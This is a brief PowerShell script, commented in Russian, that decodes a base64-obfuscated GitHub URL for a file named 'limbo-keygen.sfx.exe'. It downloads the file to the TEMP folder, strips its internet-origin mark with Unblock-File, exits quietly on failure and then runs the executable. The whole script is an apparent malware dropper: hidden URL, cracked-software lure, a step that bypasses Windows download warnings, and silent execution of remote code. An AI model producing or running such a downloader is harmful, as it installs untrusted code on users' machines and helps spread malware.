$base64Url = "aHR0cHM6Ly9naXRodWIuY29tL3dkYXNkYXNkd2FkYXcvbC9yYXcvcmVmcy9oZWFkcy9tYWluL2xpbWJvLWtleWdlbi5zZnguZXhl"
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Url))
$exePath = "$env:TEMP\limbo-keygen.sfx.exe"

# 1. Скачиваем
try {
    (New-Object System.Net.WebClient).DownloadFile($url, $exePath)
    Unblock-File $exePath
} catch {
    exit
}

# 2. Запускаем SFX архив
Start-Process -FilePath $exePath
